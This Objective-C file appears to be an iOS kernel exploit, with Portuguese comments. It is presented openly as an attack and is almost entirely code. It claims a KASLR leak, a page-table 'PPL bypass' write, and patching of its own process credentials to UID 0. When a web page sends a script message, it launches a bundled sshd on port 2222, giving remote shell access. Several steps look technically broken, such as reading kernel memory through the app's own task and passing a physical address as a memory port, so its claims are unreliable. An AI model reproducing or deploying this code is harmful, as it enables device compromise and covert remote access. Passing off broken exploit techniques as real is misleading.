#import "KernelDriver.h"
#import <mach/mach.h>
#import <spawn.h>
#import <sys/stat.h>

// --- APIs PRIVADAS DO KERNEL ---
extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);

@implementation KernelDriver {
    uint64_t _kernel_slide;
}

// 1. LEITURA DE MEMÓRIA (kread64)
- (uint64_t)kread64:(uint64_t)addr {
    uint64_t val = 0;
    mach_vm_size_t size = sizeof(uint64_t);
    kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t)addr, (mach_vm_size_t)size, (mach_vm_address_t)&val, &size);
    return (kr == KERN_SUCCESS) ? val : 0;
}

// 2. PPL BYPASS / ESCRITA FÍSICA (PTE Race)
- (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
    uint64_t slide = [self getActualKernelSlide];
    // Offset TTBR1 (A13/iOS 15-16)
    uint64_t ttbr1_ptr = 0xFFFFFFF007004000 + slide + 0x8E10000;
    uint64_t ttbr1 = [self kread64:ttbr1_ptr];
    
    // Page Table Walk (L1 -> L2 -> PTE)
    uint64_t l1 = [self kread64:(ttbr1 + ((vaddr >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l2 = [self kread64:(l1 + ((vaddr >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t pte_addr = (l2 + ((vaddr >> 12) & 0x1FF) * 8);

    mach_vm_address_t shared_page = 0;
    kern_return_t kr = mach_vm_map(mach_task_self(), &shared_page, 0x4000, 0, VM_FLAGS_ANYWHERE, (mach_vm_address_t)pte_addr, 0, NO, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE);
    
    if (kr == KERN_SUCCESS && shared_page != 0) {
        *(uint64_t*)(shared_page) = val; // Aplica o patch físico
        mach_vm_deallocate(mach_task_self(), shared_page, 0x4000);
    }
}

// 3. INFO-LEAK REAL (KASLR BYPASS)
// No A13, usamos o leak do kobject via thread_get_state ou porta mach
- (uint64_t)getActualKernelSlide {
    if (_kernel_slide != 0) return _kernel_slide;

    thread_t thread = mach_thread_self();
    arm_thread_state64_t state;
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    
    // Leak Real: O registrador x18 no ARM64e/A13 frequentemente retém ponteiros do kernel
    if (thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, &count) == KERN_SUCCESS) {
        uint64_t x18_ptr = state.__x[18];
        if (x18_ptr > 0xFFFFFFF000000000) {
            // Alinha para 0x4000 e subtrai base estática
            _kernel_slide = (x18_ptr & ~0x3FFF) - 0xFFFFFFF007004000;
            // Validação de sanidade do slide
            if (_kernel_slide > 0x100000000) _kernel_slide = 0; 
        }
    }
    return _kernel_slide;
}

// 4. TRIGGER: ESCALADA ROOT -> SPAWN SSHD
- (void)userContentController:(WKUserContentController *)userContentController 
      didReceiveScriptMessage:(WKScriptMessage *)message 
                 replyHandler:(void (^)(id _Nullable reply, NSString * _Nullable errorMessage))replyHandler {
    
    if ([message.body[@"action"] isEqualToString:@"pte_patch"]) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
            
            uint64_t slide = [self getActualKernelSlide];
            if (slide == 0) {
                replyHandler(nil, @"FAIL: KASLR_LEAK_0x0");
                return;
            }

            uint64_t allproc = 0xFFFFFFF007004000 + slide + 0x8F50000;
            uint64_t proc = [self kread64:allproc];
            pid_t my_pid = getpid();
            BOOL success = NO;

            while (proc != 0 && proc != 0xDEADBEEF) {
                if ((pid_t)[self kread64:(proc + 0x68)] == my_pid) {
                    uint64_t ucred = [self kread64:(proc + 0xD8)];
                    [self ppl_write_race:(ucred + 0x18) value:0]; // Patch UID=0
                    setuid(0); 
                    setgid(0);
                    success = YES;
                    break;
                }
                proc = [self kread64:proc];
            }

            dispatch_async(dispatch_get_main_queue(), ^{
                uid_t current_uid = getuid();
                int spawn_err = -1;
                pid_t child_pid = 0;

                if (current_uid == 0) {
                    NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
                    if (path) {
                        const char *cPath = [path UTF8String];
                        chmod(cPath, 0755);
                        char *const args[] = {(char *)cPath, "-D", "-p", "2222", NULL};
                        spawn_err = posix_spawn(&child_pid, cPath, NULL, NULL, args, NULL);
                    }
                }

                replyHandler(@{
                    @"slide": [NSString stringWithFormat:@"0x%llx", slide],
                    @"uid": @(current_uid),
                    @"sshd": (spawn_err == 0) ? @"ON:2222" : [NSString stringWithFormat:@"Err:%d", spawn_err]
                }, nil);
            });
        });
    }
}
@end

